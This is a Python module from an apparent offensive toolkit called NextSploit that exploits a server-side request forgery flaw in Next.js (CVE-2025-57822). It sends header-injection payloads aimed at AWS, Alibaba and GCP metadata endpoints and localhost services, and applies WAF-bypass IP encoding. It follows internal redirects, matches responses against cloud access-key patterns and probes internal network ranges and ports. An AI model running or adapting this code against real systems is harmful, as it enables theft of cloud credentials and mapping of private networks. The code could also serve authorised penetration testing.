#!/usr/bin/env python3
"""
NextSploit — CVE-2025-57822: Server-Side Request Forgery (SSRF) v2

Key improvements over v1:
  - Baseline comparison per endpoint — eliminates false positives
  - Context-aware keyword matching (strips GTM/analytics <script> tags)
  - AWS IMDS & internal service pattern detection
  - /wallet anomaly elevated tracking
  - GCP metadata endpoint added

Affected: Next.js < 14.2.32
"""

import os
import re
import hashlib
import requests
import concurrent.futures

from core.config import ScanConfig
from core.cve_database import CVE_DATABASE
from core.reporter import ModuleResult, Finding, ScanStatus
from core.waf_bypass import WAFBypass
from core.output import (
    log_info, log_success, log_warning, log_critical, log_debug,
    log_trace, log_error, log_status, print_module_header, print_finding,
    create_progress,
)

CVE_ID = "CVE-2025-57822"
CVE_INFO = CVE_DATABASE[CVE_ID]

HEADER_PAYLOADS = [
    # Cloud metadata — highest priority
    {"Location": "http://169.254.169.254/latest/meta-data/"},
    {"Location": "http://100.100.100.200/latest/meta-data/"},
    {"Location": "http://metadata.google.internal/computeMetadata/v1/"},
    # Localhost services
    {"Location": "http://127.0.0.1:3000/"},
    {"Location": "http://localhost:3000/_next/data"},
    # Header injection
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/_next/data"},
    {"next-url": "http://127.0.0.1:3000/api/admin"},
]

SSRF_ENDPOINTS = [
    "/", "/api", "/wallet", "/account",
    "/_next/data/", "/api/auth/session",
]

PARAM_SSRF_ENDPOINTS = [
    "/api/proxy?url=", "/api/fetch?url=", "/api/redirect?url=",
]

INTERNAL_RANGES = [
    "10.0.0.{}", "172.16.0.{}", "192.168.1.{}",
]

INTERNAL_PORTS = [80, 443, 3000, 8080, 6379, 3306]

# High-confidence IMDS/internal service fingerprints
IMDS_PATTERNS = [
    r'ami-[0-9a-f]{8,17}',
    r'"AccessKeyId"\s*:',
    r'"SecretAccessKey"\s*:',
    r'"Token"\s*:\s*"[A-Za-z0-9/+=]{50,}',
    r'iam/security-credentials/[A-Za-z0-9\-]+',
    r'computeMetadata',
    r'redis_version',
    r'"cluster_name"\s*:',
    r'"version"\s*:\s*\{"number"',
    r'\+OK\r\n',
    r'EHLO|250-PIPELINING',
]

SCRIPT_TAG_RE = re.compile(r'<script[^>]*>.*?</script>', re.DOTALL | re.IGNORECASE)
SENSITIVE_KEYWORDS_STRICT = ["secretAccessKey", "AccessKeyId", "ami-", "redis_version"]
# Removed 'key' and 'flag' — too generic, cause false positives on airline/ecommerce sites
SENSITIVE_KEYWORDS_GENERAL = ["secret", "admin", "internal", "token", "password", "private", "credential", "api_key", "apikey"]

INTERNAL_HOSTS = ["127.0.0.1", "localhost", "169.254", "0.0.0.0", "10.", "172.16", "192.168", "100.100.100.200", "metadata.google"]


def _hash(text: str) -> str:
    return hashlib.md5(text.encode(errors="ignore")).hexdigest()


def _strip_scripts(html: str) -> str:
    return SCRIPT_TAG_RE.sub("", html)


def _is_imds_response(text: str) -> tuple:
    for pat in IMDS_PATTERNS:
        if re.search(pat, text, re.IGNORECASE):
            return True, pat
    return False, ""


def _find_keywords(text: str) -> list:
    found = []
    for kw in SENSITIVE_KEYWORDS_STRICT:
        if kw.lower() in text.lower():
            found.append(kw)
    stripped = _strip_scripts(text)
    for kw in SENSITIVE_KEYWORDS_GENERAL:
        if kw.lower() in stripped.lower() and kw not in found:
            found.append(kw)
    return found


NORMAL_PAGE_INDICATORS = [
    r'<html[^>]*lang=',
    r'<meta[^>]+charset',
    r'<meta[^>]+name="description"',
    r'<link[^>]+rel="canonical"',
    r'<!DOCTYPE html>',
]

def _is_normal_html_page(text: str) -> bool:
    """Detect if response is a normal rendered HTML page (not SSRF data)."""
    if len(text) < 200:
        return False
    matches = sum(1 for pat in NORMAL_PAGE_INDICATORS if re.search(pat, text[:2000], re.IGNORECASE))
    return matches >= 3


def _is_ssrf_confirmation(text: str, size_diff: int, keywords: list) -> tuple:
    """
    Determine if response truly indicates SSRF vs a normal page redirect.
    Returns (is_confirmed, confidence, reason).
    """
    # IMDS match is always high confidence
    imds_hit, imds_pat = _is_imds_response(text)
    if imds_hit:
        return True, 1.0, f"IMDS pattern: {imds_pat}"

    # If response is a normal HTML page, it's likely just a fallback/404 - false positive
    if _is_normal_html_page(text):
        return False, 0.0, "Response is a normal HTML page (likely 404 fallback)"

    # Non-HTML response with significant size diff + keywords
    if keywords and size_diff > 500 and not _is_normal_html_page(text):
        return True, 0.75, f"Non-HTML response with keywords: {', '.join(keywords[:3])}"

    # Large diff but no keywords and no HTML — could be binary/data
    if size_diff > 2000 and not text.strip().startswith('<'):
        return True, 0.6, f"Non-HTML response (size diff: {size_diff})"

    return False, 0.0, "No confirmation signal"


def _is_waf_block(session: requests.Session, target: str, endpoint: str, hkey: str, hval: str, config: ScanConfig) -> bool:
    """Send a dummy payload to check if the behavior is caused by WAF/Cloudflare rules."""
    dummy_headers = {hkey: "/invalid_waf_test_123_xyz"}
    try:
        r_dummy = session.get(
            f"{target}{endpoint}", headers=dummy_headers,
            timeout=config.timeout, allow_redirects=False,
        )
        return r_dummy.status_code in (403, 400, 406, 503)
    except Exception:
        return False


def scan(config: ScanConfig) -> ModuleResult:
    """
    Scan for CVE-2025-57822 (SSRF).
    Phase 1: Baseline collection
    Phase 2: Header injection with diff analysis
    Phase 3: Parameter-based SSRF
    Phase 4: Internal network scan (verbose)
    """
    result = ModuleResult(
        cve=CVE_ID, title=CVE_INFO["title"],
        severity=CVE_INFO["severity"], status=ScanStatus.SAFE,
    )
    print_module_header(CVE_ID, CVE_INFO["title"], CVE_INFO["severity"])
    session = config.create_session()
    target = config.target.rstrip("/")
    os.makedirs(config.output_dir, exist_ok=True)

    # ── Phase 1: Baseline ────────────────────────────────────────────────
    log_info("[Phase 1] Collecting baseline responses per endpoint...")
    baselines = {}
    for endpoint in SSRF_ENDPOINTS:
        try:
            r = session.get(f"{target}{endpoint}", timeout=config.timeout, allow_redirects=False)
            
            # Dynamic size variance checking (try twice)
            try:
                r2 = session.get(f"{target}{endpoint}", timeout=config.timeout, allow_redirects=False)
                variance = abs(len(r.text) - len(r2.text))
            except:
                variance = 0
                
            baselines[endpoint] = {
                "hash": _hash(r.text), "status": r.status_code,
                "size": len(r.text), "location": r.headers.get("Location", ""),
                "keywords": _find_keywords(r.text),
                "variance": variance
            }
            log_debug(f"Baseline [{r.status_code}] {endpoint} — {len(r.text)} bytes (variance: {variance})")
        except requests.RequestException:
            baselines[endpoint] = {"hash": "", "status": 0, "size": 0, "location": "", "keywords": [], "variance": 0}

    # ── Phase 2: Header Injection with Diff Analysis ─────────────────────
    log_info("[Phase 2] Header injection SSRF (baseline diff analysis)...")
    total = len(SSRF_ENDPOINTS) * len(HEADER_PAYLOADS)

    with create_progress() as progress:
        task = progress.add_task("Header SSRF Scan", total=total)

        for endpoint in SSRF_ENDPOINTS:
            baseline = baselines.get(endpoint, {})

            for payload in HEADER_PAYLOADS:
                progress.update(task, advance=1)
                hkey = list(payload.keys())[0]
                hval = payload[hkey]
                
                # Apply WAF Bypass if enabled
                if config.waf_bypass:
                    if "127.0.0.1" in hval:
                        hval = hval.replace("127.0.0.1", WAFBypass.get_hex_ip("127.0.0.1"))
                    if "localhost" in hval:
                        hval = hval.replace("localhost", WAFBypass.get_hex_ip("127.0.0.1"))
                
                request_headers = {hkey: hval}
                if config.waf_bypass:
                    request_headers = WAFBypass.manipulate_headers(request_headers)

                try:
                    r = session.get(
                        f"{target}{endpoint}", headers=request_headers,
                        timeout=config.timeout, allow_redirects=False,
                    )
                    log_trace(f"[{r.status_code}] {endpoint} | {hkey}: {hval}")

                    # Check 1: Redirect to internal
                    if r.status_code in (301, 302, 307, 308):
                        loc = r.headers.get("Location", "")
                        is_internal = any(x in loc for x in INTERNAL_HOSTS)
                        is_new = loc != baseline.get("location", "")
                        if is_internal and is_new:
                            detail = f"SSRF internal redirect: {loc} via {hkey} on {endpoint}"
                            log_critical(detail)
                            evidence = {
                                "endpoint": endpoint,
                                "header": f"{hkey}: {hval}",
                                "redirect_location": loc,
                                "status_code": r.status_code,
                                "baseline_location": baseline.get("location", ""),
                            }
                            sev = "HIGH"
                            try:
                                r2 = session.get(loc, timeout=config.timeout)
                                evidence["redirect_status"] = r2.status_code
                                evidence["redirect_size"] = f"{len(r2.text)} bytes"
                                imds_hit, imds_pat = _is_imds_response(r2.text)
                                if imds_hit:
                                    sev = "CRITICAL"
                                    evidence["imds_pattern"] = imds_pat
                                    evidence["preview"] = r2.text[:500]
                                else:
                                    evidence["preview"] = r2.text[:300]
                            except Exception as e:
                                log_trace(f"Failed to follow redirect {loc}: {e}")
                            print_finding(CVE_ID, detail, evidence)
                            result.add_finding(Finding(
                                cve=CVE_ID, severity=sev,
                                title="SSRF Internal Redirect",
                                status=ScanStatus.VULNERABLE, detail=detail, evidence=evidence,
                            ))
                        elif not is_internal:
                            log_debug(f"Redirect to: {loc} (external)")

                    # Check 2: 200 with diff analysis
                    elif r.status_code == 200 and len(r.text) > 100:
                        resp_hash = _hash(r.text)
                        base_size = baseline.get("size", 0)
                        base_variance = baseline.get("variance", 0)
                        size_diff = abs(len(r.text) - base_size)

                        if resp_hash == baseline.get("hash", ""):
                            log_trace(f"Identical to baseline: {endpoint}|{hkey}")
                            continue

                        if size_diff <= (base_variance + 100):
                            continue

                        raw_keywords = _find_keywords(r.text)
                        base_keywords = baseline.get("keywords", [])
                        keywords = [kw for kw in raw_keywords if kw not in base_keywords]

                        confirmed, confidence, reason = _is_ssrf_confirmation(r.text, size_diff, keywords)
                        if not confirmed:
                            log_trace(f"Skipped (FP filtered): {endpoint}|{hkey} — {reason}")
                            continue

                        imds_hit, imds_pat = _is_imds_response(r.text)
                        if imds_hit:
                            detail = f"IMDS data in response via {hkey} on {endpoint} (pattern: {imds_pat})"
                            log_critical(detail)
                            sev = "CRITICAL"
                        else:
                            detail = (
                                f"Non-HTML SSRF response via {hkey} on {endpoint} "
                                f"(size diff: {size_diff}, reason: {reason})"
                            )
                            log_warning(detail)
                            sev = "HIGH"

                        evidence = {
                            "endpoint": endpoint,
                            "header": f"{hkey}: {hval}",
                            "keywords_found": keywords,
                            "response_size": f"{len(r.text)} bytes",
                            "baseline_size": f"{base_size} bytes",
                            "size_diff": f"{size_diff} bytes",
                            "confirmation_reason": reason,
                            "confidence": confidence,
                            "preview": r.text[:500],
                        }
                        if imds_hit:
                            evidence["imds_pattern"] = imds_pat

                        filename = f"ssrf_{endpoint.replace('/', '_')}_{hkey}.txt"
                        saved_path = config.save_response(filename, r)
                        if saved_path:
                            evidence["saved_to"] = saved_path

                        print_finding(CVE_ID, detail, evidence)
                        result.add_finding(Finding(
                            cve=CVE_ID, severity=sev,
                            title="SSRF-Induced Response Difference",
                            status=ScanStatus.VULNERABLE, detail=detail, evidence=evidence,
                        ))


                    # Check 3: General Anomaly & WAF Validation
                    elif r.status_code != baseline.get("status", -1):
                        # Verify if this status change is just WAF blocking the header key
                        if r.status_code in (403, 400, 406, 503):
                            is_waf = _is_waf_block(session, target, endpoint, hkey, hval, config)
                            if is_waf:
                                log_trace(f"Ignored anomaly on {endpoint} via {hkey}: Blocked by WAF/Cloudflare")
                                continue

                        detail = f"Status changed: {baseline.get('status')} → {r.status_code} via {hkey} on {endpoint}"
                        log_warning(f"[ANOMALY] {detail}")
                        evidence = {
                            "endpoint": endpoint,
                            "header": f"{hkey}: {hval}",
                            "baseline_status": baseline.get("status"),
                            "new_status": r.status_code,
                        }
                        result.add_finding(Finding(
                            cve=CVE_ID, severity="MEDIUM",
                            title="SSRF Status Anomaly",
                            status=ScanStatus.VULNERABLE, detail=detail, evidence=evidence,
                        ))

                except requests.RequestException as e:
                    log_trace(f"Error {endpoint}|{hkey}: {e}")

    # ── Phase 3: Parameter-based SSRF ────────────────────────────────────
    log_info("[Phase 3] Parameter-based SSRF endpoint discovery...")
    ssrf_test_url = "http://127.0.0.1:80/"
    with create_progress() as progress:
        task = progress.add_task("Param SSRF Probe", total=len(PARAM_SSRF_ENDPOINTS))
        for param_ep in PARAM_SSRF_ENDPOINTS:
            progress.update(task, advance=1)
            url = f"{target}{param_ep}{ssrf_test_url}"
            try:
                r = session.get(url, timeout=config.timeout, allow_redirects=False)
                log_trace(f"[{r.status_code}] {param_ep}")
                if r.status_code == 200 and len(r.text) > 50:
                    if _is_normal_html_page(r.text):
                        log_trace(f"Skipped {param_ep}: returned a normal HTML page (likely 404/fallback).")
                        continue
                        
                    detail = f"SSRF param endpoint responds: {param_ep} (status 200, {len(r.text)} bytes)"
                    log_warning(detail)
                    evidence = {"endpoint": param_ep, "test_url": ssrf_test_url, "response_size": f"{len(r.text)} bytes"}
                    print_finding(CVE_ID, detail, evidence)
                    result.add_finding(Finding(
                        cve=CVE_ID, severity="HIGH", title="Parameter-based SSRF Endpoint",
                        status=ScanStatus.VULNERABLE, detail=detail, evidence=evidence,
                    ))
            except requests.RequestException as e:
                log_trace(f"Network error probing {param_ep}: {e}")

    # ── Phase 4: Internal Network Scan ───────────────────────────────────
    if config.verbosity >= 1:
        log_info("[Phase 4] Internal network scan (verbose mode)...")
        _scan_internal_network(config, session, target, result)
    else:
        log_info("[Phase 4] Skipped internal network scan (use -v to enable)")

    if result.finding_count > 0:
        log_critical(f"Found {result.finding_count} SSRF indicators")
    else:
        log_success("No SSRF vulnerabilities detected (baseline comparison active)")

    return result


def _scan_internal_network(config, session, target, result):
    """Scan internal network ranges via SSRF."""
    log_info("Scanning localhost ports...")
    for port in [80, 3000, 3001, 4000, 5000, 8080, 8443, 9200, 6379, 5432, 3306, 27017]:
        for ip in ["127.0.0.1", "0.0.0.0"]:
            url = f"http://{ip}:{port}"
            try:
                r = session.get(target, headers={"Location": url, "X-Forwarded-For": ip},
                    timeout=min(config.timeout, 5), allow_redirects=False)
                if r.status_code in (301, 302, 307, 308):
                    loc = r.headers.get("Location", "")
                    if ip in loc or str(port) in loc:
                        log_warning(f"Internal redirect via {ip}:{port} → {loc}")
                        result.add_finding(Finding(
                            cve=CVE_ID, severity="HIGH", title="Internal Service Access",
                            status=ScanStatus.VULNERABLE, detail=f"Redirect to {ip}:{port}",
                            evidence={"ip": ip, "port": port, "redirect": loc},
                        ))
            except Exception as e:
                log_trace(f"Error probing {ip}:{port}: {e}")

    log_info("Scanning internal network ranges (limited)...")

    def _probe(ip, port):
        try:
            r = session.get(target, headers={"Location": f"http://{ip}:{port}", "X-Forwarded-For": ip},
                timeout=min(config.timeout, 5), allow_redirects=False)
            if r.status_code in (301, 302):
                loc = r.headers.get("Location", "")
                if ip in loc:
                    return (ip, port, loc)
        except Exception as e:
            log_trace(f"Internal network probe failed {ip}:{port}: {e}")
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=config.threads) as ex:
        futures = [
            ex.submit(_probe, INTERNAL_RANGES[ri].format(i), INTERNAL_PORTS[pi])
            for ri in range(min(3, len(INTERNAL_RANGES)))
            for i in range(1, 11)
            for pi in range(min(5, len(INTERNAL_PORTS)))
        ]
        for future in concurrent.futures.as_completed(futures):
            res = future.result()
            if res:
                ip, port, loc = res
                log_critical(f"Internal service: {ip}:{port} → {loc}")
                result.add_finding(Finding(
                    cve=CVE_ID, severity="HIGH", title="Internal Network Service",
                    status=ScanStatus.VULNERABLE, detail=f"Internal service accessible: {ip}:{port}",
                    evidence={"ip": ip, "port": port, "redirect": loc},
                ))
